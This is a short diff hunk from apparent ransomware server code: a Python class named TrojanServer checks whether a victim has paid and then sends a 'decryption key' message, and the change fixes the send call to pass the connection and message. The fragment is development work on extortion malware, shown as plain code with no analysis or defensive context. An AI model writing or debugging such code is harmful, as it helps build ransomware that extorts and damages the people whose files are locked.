@@ -133,8 +133,8 @@ class TrojanServer:
             if has_paid == "yes":
                 paid = True
         
-        msg = b"sending decryption key"
-        protocol.send()
+        msg = "sending decryption key"
+        protocol.send(self.conn, msg)
 
 
 
